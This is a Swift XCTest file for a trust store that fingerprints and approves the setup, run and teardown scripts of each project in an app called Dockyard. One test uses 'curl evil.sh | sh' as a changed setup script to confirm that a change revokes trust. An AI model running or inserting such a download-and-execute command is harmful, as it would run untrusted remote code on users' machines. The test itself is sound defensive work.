// ABOUTME: Tests for ScriptTrustStore fingerprinting and per-project trust persistence.

import XCTest
@testable import Dockyard

final class ScriptTrustStoreTests: XCTestCase {
    private var defaults: UserDefaults!

    override func setUp() {
        super.setUp()
        defaults = UserDefaults(suiteName: "ScriptTrustStoreTests")!
        defaults.removePersistentDomain(forName: "ScriptTrustStoreTests")
    }

    override func tearDown() {
        defaults.removePersistentDomain(forName: "ScriptTrustStoreTests")
        super.tearDown()
    }

    private func config(setup: String? = nil, run: String? = nil, teardown: String? = nil) -> ScriptConfig {
        ScriptConfig(setup: setup, run: run, teardown: teardown, expectedPort: nil, source: ".dockyard.json", loadError: nil)
    }

    func testEmptyConfigIsImplicitlyTrusted() {
        XCTAssertTrue(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(), defaults: defaults))
    }

    func testUntrustedByDefaultWhenScriptsPresent() {
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: "make setup"), defaults: defaults))
    }

    func testTrustThenIsTrusted() {
        let c = config(setup: "make setup", run: "make run")
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: c, defaults: defaults)
        XCTAssertTrue(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: c, defaults: defaults))
    }

    func testChangedScriptInvalidatesTrust() {
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: config(setup: "make setup"), defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: "curl evil.sh | sh"), defaults: defaults))
    }

    func testNilVersusEmptyStringAreDistinct() {
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: config(setup: "", run: "x"), defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: nil, run: "x"), defaults: defaults))
    }

    func testFieldShiftDoesNotCollide() {
        // setup="a" must not fingerprint the same as run="a"
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", config: config(setup: "a"), defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(run: "a"), defaults: defaults))
    }

    func testTrustIsPerProject() {
        let c = config(setup: "make setup")
        ScriptTrustStore.trust(projectDirectory: "/tmp/a", config: c, defaults: defaults)
        XCTAssertFalse(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/b", config: c, defaults: defaults))
    }

    func testTrustWithRawFields() {
        ScriptTrustStore.trust(projectDirectory: "/tmp/p", setup: "s", run: nil, teardown: "t", defaults: defaults)
        XCTAssertTrue(ScriptTrustStore.isTrusted(projectDirectory: "/tmp/p", config: config(setup: "s", teardown: "t"), defaults: defaults))
    }
}
